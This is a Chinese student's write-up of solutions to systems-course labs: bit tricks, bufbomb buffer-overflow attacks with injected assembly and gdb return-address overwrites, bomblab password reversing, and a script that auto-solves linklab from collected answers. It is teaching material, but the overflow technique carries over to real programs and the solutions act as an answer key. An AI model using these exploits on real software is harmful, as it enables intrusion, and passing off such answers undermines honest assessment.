# 计算机基础实验的一些说明

找的到的东西都翻上来了（2021），不过听说内容改了，但应该改不到哪里去，毕竟是抄的国外的实验材料。

时间有点久，有几个实验记不清了，反正先这样吧。

## lab1 datalab

> **有限操作符的位运算实现**

提供了三个版本的实现：

- bits.c 正常做的版本，包括刷榜过程中重写的各个版本
- bits_high-score.c 极限刷榜版
- bits_normal-score.c 回拉了下 op 数，属于比较正常的版本

datalab 的位运算实现应该不止这些，所以当年的实验题库可能跟 2021 年的不完全一样。没有的部分就需要自己写了。

## lab2 buflab

> **忘了×1，应该是缓冲区攻击修改跳转地址？**

~~乐，这个我好像没写脚本，因为基本都做出来了。~~

从邮箱里翻到了实验材料，想起来一丢丢了。

此处使用 gdb 调试进行演示，关于如何使用 gdb 请看下面的 lab3。

在以下的部分中，首先使用 gdb 完成全部任务，确定逻辑无误后最后统一打成 hex 流。

> 所有答案对应的汇编代码在 buflab 下提供，直接在 buflab 下执行 make 即可，生成的 .bin 为对应的输入内容，.ans 为对应的十六进制序列。关于更多可运行的只能可以查看 Makefile。
>
> 关于如何使用这些汇编代码可以在简单阅读以下的内容后修改位于各个文件头部的几个常量定义即可。

~~**恶魔的低语：我说你明明都能够缓冲区攻击了为什么还要按他的流程走？直接编排一个 pass 的执行路径不就好了吗？**~~

~~**恶魔的低语×2：linklab 也是如此，只不过人家有正义制裁，所以能骗，但是只能骗一点点。**~~

### phase 1 - smoke

bufbomb 执行完 getbuf 后默认的跳转地址在 test 中，完成本关需要修改返回地址到 smoke

i386 函数调用的入栈顺序为：

1. 参数自右向左压栈
2. 函数返回地址
3. 当前栈底指针 \$ebp

此处直接定位到 getbuf 的 ret 指令，也即执行完 leave 之后。

leave 指令等效于 `mov %ebp, %esp; pop %ebp`，故到达 ret 时栈顶指针 $esp 将指向返回地址。

```gdb
b *(getbuf+21)
c
set *(void**)$esp=smoke
c
```

### phase 2 - fizz

查看 fizz 反汇编，不难得其要求一个参数，该参数将与 cookie 比较，相等时通过。

使用 `makecookie <你的学号>` 得到你的 cookie，此处假设为 0x7d97e567。

```gdb
b *(getbuf+21)
c
set *(void**)$esp=fizz
b *(fizz+9)
c
set $eax=0x7d97e567
c
```

### phase 3 - bang

本例中，将 0x804d138 <global_value> 与 cookie 作比较，故关键点就是找到设置全局变量的方法。

可以尝试看看 bufbomb 的反汇编有没有设置 global_value 的方法：

`objdump -D bufbomb | grep 0x804d138`

你大概会发现出现 0x804d138 的地方就那么一处，所以想套现成的方法是行不通了。

代码段是肯定改不了了，但是所幸跳转指令（此处指 ret）非常有操作空间！

故可以将 getbuf 的返回地址设置为 getbuf 的缓冲区基址，并向缓冲区填充赋值 global_value 与跳转至 bang 的代码。

编写汇编保存为 solve-bang.s：

```assembly
mov $0x7d97e567, %eax
mov %eax, 0x804d138
push $0x8048c55
ret
```

使用以下命令得到缓冲区的指令与十六进制序列：

```sh
gcc -c solve-bang.s
objcopy -O binary -j .text solve-bang.o solve-bang.bin
xxd -c 8 -g 1 solve-bang.bin | cut -d ' ' -f 2-9 > solve-bang.hex
```

将 solve-bang.bin 输入并运行，重新启动 gdb 调试运行以下命令，通过。

```gdb
b *(getbuf+9)
c
printf "dest ret addr: %#lx\n", $eax
b *(getbuf+20)
c
x /4i $ebp-0x28
set $eax=$ebp-0x28
b *(getbuf+21)
c
set *(void**)$esp=$eax
c
```

> "dest ret addr: ..." 输出的地址为缓冲区基地址，即 getbuf 需要的返回地址。

### phase 4 - boom

本例中 getbuf 需要跳转到 test 方法中，其中 test 将检测堆栈状态并对 getbuf 的返回值与 cookie 进行判定。

重新描述下，也即 getbuf 需要在不破坏堆栈状态的情况下设置返回值并返回，也即**最完美的实现应当是与调用方是否为 test 无关**。

比照 phase 3，该任务只需要想办法备份进入 getbuf 时的返回地址即可。

但是很显然，采取攻击需要覆写返回地址，不覆写地址就无法完成攻击。

故而上面提到的所谓**最完美的实现**应当是做不到的，所以还是得查 test 调用 getbuf 时的返回地址并硬编码。

> 断言且实际真的能够做到的神们请提前受我一拜！

另一个部分是恢复栈帧，也即 \$ebp 和 \$esp 的值。其中 \$esp 的值在该攻击中并不受影响，故只需恢复 \$ebp 的值。

在进入函数时会有一次 `mov %ebp, %esp`，故在 getbuf 函数中关于 \$ebp 的线索的来源只有 \$esp。

但在 leave 指令后栈帧恢复，\$esp 不再持有旧 \$ebp 的值，所以在 getbuf 函数中是找不到答案的，只能去 getbuf 的调用方 test 函数内找答案。

反汇编 test 函数得到以下内容（部分）：

```asm
push   %ebp
mov    %esp,%ebp
push   %ebx
sub    $0x14,%esp
call   8048d41 <uniqueval>
mov    %eax,-0xc(%ebp)
call   80491c1 <getbuf>
...
```

可以看到到调用 getbuf 为止共开辟了 0x14 字节的栈上空间，而在调用 getbuf 之后 ebp 指针压栈，此时存在 `$esp+0x18==$ebp`。

到此答案已经知晓了，只需要将 \$ebp 恢复至进入 getbuf 时 \$esp+0x18 即可（也即 leave 之后的 \$esp 值）。

```gdb
b *(getbuf+9)
c
printf "origin ret addr: %#lx\n", *(void**)($ebp+4)
printf "dest ret addr: %#lx\n", $eax
b *(getbuf+20)
c
x /3i $ebp-0x28
set $eax=$ebp-0x28
b *(getbuf+21)
set *(void**)$esp=$eax
c
```

> "origin ret addr: ..." 为 getbuf 原返回地址。

> 不管缓冲区地址变不变，上面这段 gdb 指令一定是可以 pass 的，毕竟拿的栈帧总是当前的栈帧而不是硬编码，下一个 kaboom 也是一样。

### phase 5 - kaboom

kaboom 启动需要加个 -n 参数，跟 boom 唯一的区别就是 test 换成了 testn，getbuf 换成了 getbufn。

抓关键来说，就是从一次 test 判断变成了 5 次 testn 判断，每次判断的逻辑不变。

简单观察下反汇编可以知道 getbufn 和 testn 都只在一个地方调用，所以 getbufn 返回 testn 的返回地址一定是固定的。

而一般情况下只要不整什么花活比如**栈上动态分配内存但是不释放**或者**内联汇编移动栈指针**，那 getbufn 在栈上开辟的缓冲区地址都是不会变的。

但是问题来了，它实际上是变动的！

若不考虑地址的变动问题，答案显而易见，把 phase 4 的攻击代码改改参数重复个 5 遍就行了。

由于 5 次 testn 调用相当于 5 次 getbufn 调用相当于 5 次读入，所以需要稍稍改改对应的代码。

编写仅供 gdb 调试用的 solve-kabomb.s 程序：

```assembly
.rept 5
    mov $0x7d97e567, %eax
    push $0x8048de5
    ret

    .byte 0x0a
.endr
```

> 以上代码不含栈帧恢复

前 3 条指令与 phase 4 逻辑一致，第四条 `db 0x0a` 定义了 1 字节值为 0x0a 的数据，即 '\n'，这被视为终止符结束一次 getbufn 输入。

> 使用的均为 AT&T 汇编，可以直接使用 gcc 或 as 进行编译。

编译指令：

```assembly
nasm solve-kabomb.s -f elf
objcopy -O binary -j .text solve-kabomb.o solve-kabomb.bin
```

将 solve-kabomb.bin 指定为输入并重新启动：

```gdb
b *(getbufn+26)
b *(getbufn+27)
define solve_once
set $eax=$ebp-0x208
printf "current dest ret addr: %#lx\n", $eax
c
set *(void**)$esp=$eax
c
end
c
solve_once
solve_once
solve_once
solve_once
solve_once
```

**再考虑缓冲区地址改变的情况**

做出一个假设：缓冲区基址变了，但是并没有变太多。

通过前面的 gdb 调试可以看到 5 次调用的缓冲区基址，例如以下序列：

```plain
0x556832c8
0x55683248
0x55683328
0x55683318
0x55683258
```

计算极值差得到 224 字节，然而 getbufn 的缓冲区大小为 512 字节，几乎是地址最大浮动的 2 倍！

**那么硬编码也不是不行嘛，大不了浪费一些缓冲区空间就是了**

解决方案如下：

调试得到 5 次调用的缓冲区地址，最大值记为 M，最小值记为 m，攻击代码（不含覆盖返回地址的 8 字节）长度为 l。

> 如果 M - m + l > 512 就自求多福吧，可能上天就是不想让你过这课。

若 getbufn 的跳转地址为 p，攻击代码的填充位置为 q，则应满足 M <= p <= p + l <= m + 512，0 <= q < q + l < 512。

**不妨令攻击代码填充在缓冲区末尾，令跳转位置为最大缓冲区地址。**

关于栈帧恢复的部分与 boom 一致，由于 testn 中只调用了一次 getbufn，所以旧 \$ebp 的值也是固定的为 \$esp+0x18。

## lab3 bomblab

> **忘了×2，不过应该差不多是是走流程抓返回值**

gdb 打断点慢慢跑吧，应该挺快。

这实验好像是要抓 6 个密码，简单讲讲吧。

### 关于 gdb 调试的说明

如果使用的是虚拟机，那可以跳过该部分。

如果使用的是 WSL2，可以安装 qemu-user 进行实验。该实验的程序使用 `-ggdb` 选项编译，所以不用担心没有调试信息。参考启动步骤如下：

qemu 启动 gdb 服务并运行程序：

```sh
qemu-i386 -g 1234 ./bomb-quiet -f ans
```

> 由于 bomb 程序执行时若不存在输入程序会尝试从输入流读取，这会导致调试过程被 IO 打断，对于使用不熟练的同学可能会造成一些麻烦，故此处建议直接指定输入文件。

此处提供了 Makefile 和 i386 下 gdb 的配置，直接使用 make 启动 gdb 即可：

```sh
make gdb TARGET=./bomblab/bomb-quiet
```

> TARGET 为执行需要调试的程序，此处主要是为了为远程调试加载符号信息。
>
> 由于 gdb 启动引用了相对路径下的配置文件，故请务必确保 make gdb 在当前目录下运行（./basis），详情见 Makefile。

### phase 1

**方法一：赌狗法**

命令 `strings bomb-quiet` 打印出字符串，找一个你觉得最格格不入的并且看上去像是个英语句子的字符串，那基本就是密码了。

**方法二：常规**

gdb 启动，断点打在 phase_1，第一个 strings_not_equal 调用第一个压栈的参数就是密码的地址了。

参考 gdb 命令：

```gdb
b *(phase_1+14)
c
x /s *(void**)($esp+4)
```

### phase 2

1. 不难得该步读入 6 个整数
2. 有前向 jmp，是一个循环
3. 循环内 explode_bomb 的入口是一个 cmp 指令，追溯后的指令为 `cmp [$ebp]+[$ebp+4], [$ebp+8]`

好了这是个斐波那契数列，初值由跳转至第一个 explode_bomb 的 cmp 给出。

参考 gdb 命令：

```gdb
define hook-stop
x /6d $ebp-24
p *(int(*)[6])($ebp-0x24)
printf "cmp $eax, [$ebx+8] ~ %lx <> %lx\n", $eax, *($ebx+8)
end
b *(phase_2+34)
b *(phase_2+62)
```

> hook-stop 会在每次 gdb 每次暂停时运行，合理使用有助于调试。
>
> 不同人的内容可能不一样，但基本都是简单循环。

### phase 3

套路基本一样，关注跳转至 explode_bomb 的条件跳转。

然后发现，呵，跳转还挺多。注意到有个存储器比例变址寻址 `jmp *0x8049380(,%eax,4)`，你得晓得这八九不离十是一个 switch 查表跳转。（请自行记录自己的跳转表地址）

先看前面的 sscanf，这指明了你的输入格式。sscanf 的声明类似于 `int sscanf(buffer, fmtstr, ...)`，所以查看第二个参数的内容，得到格式化字符串，此处假设是 "%d %c %d"。

第一个 explode_bomb 是对 sscanf 调用的检查，可以跳过。

接下来就来到了令人激动的 switch 跳转！

首先我们勾引一波，打出跳转表的 8 个跳转地址 `x /8w 0x8049380`，得到以下内容：

```plain
0x8049380: 0x080489ed 0x08048a0e 0x08048a2f 0x08048a4d
0x8049390: 0x08048a67 0x08048a7e 0x08048a98 0x08048ab2
```

此处跳转的 \$eax 来自 \[$ebp-0x14]，也就是第一个输入的整数。

好了，现在可以使用**瞪眼法**了，请自行看看这几个跳转地址上哪一个分支是能够继续运行下去不会 BOMB 的。

例如第 0 个地址 `0x080489ed` 上是**安全**的，那么相应的第一个整数就应该是 0。

`0x080489ed` 紧跟着 `cmpl $0x3c5, -0x10(%ebp)`，此处 \[$ebp-0x10] 对应第二个整数，故得到其值应当为 0x3c5 也即 965。

> 关于输入与变量的对应关系观察 sscanf 的参数压栈，i386 自右向左压栈，故 push 的第 1、2、3 个地址分别对应第二个整数，字符，第一个整数的变量地址。

关注下此处对 $eax 的赋值 0x73，对应字符 's'，继续执行发现来到最后一个比较 `cmp -0x15(%ebp), %al`，这正是对输入的字符的比较，故得到字符的值应为 s。

> al 寄存器对应 eax 的低 8 位。

参考 gdb 命令：

```gdb
b *(phase_3+37)
c
x /s *(void**)($esp+4)
b *(phase_3+68)
c
x /8wx 0x8049380
si 3
si 2
```

### phase 4

同 phase 3，首先看一波输入格式并记下输入与变量地址的对应关系。

此处假设是 "%d %d" 并且两个整数分别对应 \[$ebp-0x10] 和 \[$ebp-0x14]。

phase 4 的逻辑很短，但是有内部调用 func4。

观察 call 与 cmp 指令可以知道 phase 4 的判定条件是 `func4(第一个参数, 第二个整数) == 第一个整数`

其中对第二个整数（记为 n）的要求如下：

```asm
mov -0x14(%ebp),%eax
sub $0x2,%eax
cmp $0x2,%eax
jbe 0x8048b7c <phase_4+62>
```

也即应当满足 `(unsigned)(n - 2) <= 2`，可得 n 的取值集合为 {2, 3, 4}。

> 注意 jmp 指令的后缀， **a**bove/**b**elow 是无符号比较，**g**reater/**l**ess 是有符号比较

注意到 func4 是一个纯函数，也就是说 func4 的求值并不需要分析，当个黑盒传入参数拿到结果就行了。故在 call func4 的下一条指令打上断点，得到返回值也就是 \$eax。

在满足 n 的条件之后，调用 func4 后返回值 $eax 就是第一个整数的数值。

> 由于此处除了 n 的范围约束后并没有更多的限制，所以 phase 4 其实存在多个结果

参考 gdb 命令：

```gdb
b *(phase_4+33)
c
b *(phase_4+75)
c
p $eax
```

### phase 5

> 坏消息：phase 5 又是一个循环
>
> 好消息：循环体非常短

观察输入格式，芜湖，调用了 string_length 并判了返回值，看一眼 cmp 发现长度必须为 6（具体值以实际为准）。

观察主要逻辑（字符串长度检查之后），发现用的寄存器还挺多，梳理下上下文得到寄存器赋值：

```plain
$ebx: 字符串地址+0x6
$eax: 字符串地址
$ecx: 0x0
$edx: $eax[0]
```

注意到这个 6 非常的微妙，$ebx 与字符串的偏移刚好为 6，循环体中 $eax 每次自增 1，而 $eax 又与 ebx 比较决定跳转地址。

不难发现这是个遍历字符串字符的过程。

然后又是一个复杂的存储器寻址 `add 0x80493a0(,%edx,4),%ecx`，但好在逻辑异常简单，易知是查表自增。

不难翻译为以下代码：

```c
void f(char *s) {
    eax = s;
    ebx = s + 6;
    ecx = 0;
    while (eax < ebx) {
        edx = *eax;
        ecx += table[edx & 0xf];
        ++eax;
    }
    CHECK(ecx == 0x2c);
}
```

由每次循环 $edx 的取值可知表的大小至少为 16，根据寻址变比可以知道每个元素的大小为 4 字节。

故 `x /16wd 0x80493a0` 查表：

```plain
 2  10    6    1
12  16    9    3
 4   7   14    5
11   8   15   13
```

好了，到目前为止，这个问题已经变成了一个益智类凑数问题：

```plain
请选出上面 16 个数字中的 6 个数字，使他们的和为 0x2c（数字可重复使用）。
```

答案的个数不可想象，想知道具体是多少的请自行深搜并排列组合并考虑可打印字符的个数并将它们倍乘（这个计算其实还挺麻烦的，因为索引只需要取低八位就行了，故你还需要考虑 scanf 读入的字符集合）。

凑出一个答案其实非常简单，注意到 '0' 的低 8 位恰好就是 0x0，所以凑出你的索引序列后只需要将它们顺序映射到 `{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?'}`。

举个例子：

```plain
0x2c == 44 = 15 * 2 + 11 + 1 * 3
          <= [14] * 2 + [12] + [3] * 3
          <= '>' * 2 + '<' + '3' * 3
          <= ">><333"
```

参考 gdb 命令：

```gdb
b phase_5
c
b *(phase_5+39)
printf "eax: %#lx, \"%s\"\nebx: %d\necx: %d\nedx: '%c' %d %#x\n", $eax, $eax, $ebx, $ecx, $edx, $edx, $edx
x /16wd 0x80493a0
```

### phase 6

瞅一眼，又是读 6 个数。

再瞅一眼，吼，不仅长而且还不止一个循环。

先根据 read_six_number 压栈情况找到数的读入基地址 \$ebp-0x3c，读入结束完后验证下 `p *(int(*)[6])($ebp-0x3c)`。

然后第一个循环就来了，瞅一眼循环体的第一个指令 `mov -0x3c(%ebp,%esi,4),%eax`，注意到 \$esi 是自增的，好了，一眼就知道第一个循环遍历了 6 个数干了不知道什么偷鸡摸狗的事。

小小偷窥一下发现了判定条件是 `(unsigned)($eax - 1) <= 5`，好了，这下知道*数字的范围是 1~6 了*。

~~**你眉头一皱，发现事情并不简单，范围都有了，那穷举 6^6 次不就出结果了？**~~

直接转到第二个循环（注意要根据循环结束的跳转地址判断，不能默认是从上而下的第二个循环部分）。

> 循环体的起始位置可以通过前向 jmp 的目的地址判断。

然后你会发现，事情好似越发不妙起来，这个时候不妨停下来，把代码全部过一遍。

然后你就会发现这样的语句 `mov 0x8(%edx), %edx`，这合理吗？这太合理了，这不就是链表遍历的常用方式吗！不难得出 %edx 所代表的实例有这样的类型，而其本身就是链表节点的一个指针：

```cpp
struct node {
    u32   _1;
    u32   _2;
    node *next;
};
```

> 注意到该点需要了解结构体的访问成员的偏移寻址方式

这下不少事情都明朗起来了。

$edx 的第一次赋值在第一个循环结束之后，其值为 0x804b134，通过迭代偏移访问 next 成员可以得到以 0x804b134 为链表根节点的所有链表节点。

> 打印一下就会发现其实这地址的数据是有符号信息的（node1），所以用 gdb 输入 `p node` 然后补全一下就可以知道一共有 node1/node2/node3/node4/node5/node6 总共 6 个节点，或者也可以在外边直接 nm 一下。
>
> 进一步观察下符号信息可知这 6 个节点在 bss 段连续存储，所以要看数据的话不用真一个一个遍历，直接一次性输出就行。

勾引一下看看 6 个节点的数据 `p *(int(*)[6][3])&node1`，进一步明确节点结构如下：

```cpp
struct node {
    u32   value;
    u32   index;
    node *next;
};
```

**回到正轨**

在第一个循环结束之后，进入一个 8 条指令的逻辑块。

```plain
mov $0x0,%ebx
mov %ebx,%esi
mov -0x3c(%ebp,%ebx,4),%ecx
mov $0x1,$eax
mov $0x804b134,%edx
cmp $0x1,%ecx
jg  0x8048c4e <phase_6+91>
jmp 0x8048c58 <phase_6+101>
```

此时第一个数的值被 \$ecx 持有，当 \$ecx 大于 1 时，跳转到 <phase_6+91> 处，等于 1 时跳转到 <phase_6+101> 处。

先看 <phase_6+91> 处的代码，在有了前面关于链表节点的基础后，可以知道该部分的第一个循环体用于将 $edx 定位到第 $ecx 个节点。

查找完之后，紧接着就进入 <phase_6+101> 部分的代码。

不难发现两个部分其实是一体的，只不过当 $ecx 为 1 时，$edx 本身就是第 $ecx 个节点，不再需要通过 <phase_6+91> 处的逻辑更新。

<phase_6+101> 部分，分析 `mov %edx,-0x24(%ebp,%esi,4)`：\$ebp-0x24 处已经脱离了 6 个输入整数的区间，故可以判断为该部分是一个存储节点地址的数组（记为 tmp_nodes）。

该操作将当前 \$edx 节点写入 tmp_nodes[\$esi]。

其后的两个跳转 <phase_6+120>，<phase_6+143> 中，后者已经达到方法的末尾，而 <phase_6+120> 跳转至一个函数体。在这个过程中涉及 \$ebx 和 \$esi 的访问、更新与比较。

故 \$ebx 和 \$esi 基本可以确定为是 <phase_6+120> 处循环的循环变量。

而 <phase_6+120> 将 <phase_6+101> 处的 \$ebx 自增传递给了 \$esi 并访问了第 \$ebx 个输入整数，连贯起来便可得到这一大段循环实现了**以输入数字为索引将全局链表节点顺序拷贝至栈上数组**。

分析完成，直接进入下一部分 <phase_6+143>。

天啊，这一部分简直是简单明了：遍历栈上数组 tmp_nodes。

分析最终的循环体 <phase_6+154>，翻译如下：

```cpp
node  *ebx = tmp_nodes[0];
node **eax = tmp_nodes + 0;
node **esi = tmp_nodes + 5;
ecx = ebx;
do {
    edx = eax + 1;
    ecx->next = edx;
    ++eax;
    ecx = edx;
} while (eax != esi);
```

显然易见，是重建链表节点的链接（包括最后一个节点的 next 置空）。

最后的判定代码：

```cpp
esi = 5;
do {
    eax = ebx->next;
    if (!(eax->value >= ebx->value)) {
        explode_bomb();
    }
    --esi;
} while (esi != 0);
```

> 汇编哪有什么复合类型，我 eax 一下是 node** 一下是 node* 很正常吧？

> 条件转移指令通过符号寄存器决定是否跳转，而除了 cmp 指令之外，sub 指令也会影响符号寄存器的值。如果你发现了 jne 但是没有发现 cmp 或者上一条 cmp 距离很远，那么请不要疑惑，因为该条件跳转可能由更近的 sub 指令决定。

注意到 eax 总是 ebx 的后继，故 phase 6 最终归结为**重排序 node1-6 节点，令它们的 value 降序排列**。

~~**于是你又发现只要穷举排列 6! 次就必定能试出答案，这简直太可行了！**~~

```gdb
b phase_6
b *(phase_6+34)
c
c
p *(int(*)[6])($ebp-0x3c)
b *(phase_6+115)
c
b *(phase_6+139)
c
b *(phase_6+91)
b *(phase_6+101)
b *(phase_6+120)
b *(phase_6+143)
b *(phase_6+181)
p *(int(*)[6][3])&node1
```

## lab4 linklab

> **忘了×3，这个彻底忘了要干啥了**

提供了 solve 的源码和配套脚本，**运气好的话**几秒就能做完。

跑 `./script/one-shot.sh` 可以环境建立、初始化、解题、提交、打包一步到位，具体怎么跑请看脚本。

但还是那句话，注意是**运气好的话**。

one-shot.sh 包含直接提交的步骤，但是错误提交我记得是会影响分数的，所以建议先完成到解题这步，然后自己检查下。解题应该是 build.sh 吧，具体实现可以看 src 下的源码（解题直接用 solve-phase 更方便些）。

phase1-4 应该不会有什么问题，就正常步骤，只要实验内容别改的太离谱的话应该都能过。

phase5 用了取巧的方法，因为当时做完发现这玩意的关键部分是有标程的。当时搜集了八个班的实验材料最后发现只有两套模式，所以分别把这两套做了下把标程打成了 ./assets/phase5.std.1 和 ./assets/phase5.std.2，而此处 phase5 的解题方法其实就是匹配下模式选择使用哪个标程然后套上，非常简单粗暴。

这次的模式可能不一样，要是直接使用不行的话可以找课上做出来的几份 bin 然后自己打成标程。

> 别问为什么这么干，问就是不需要动脑子。
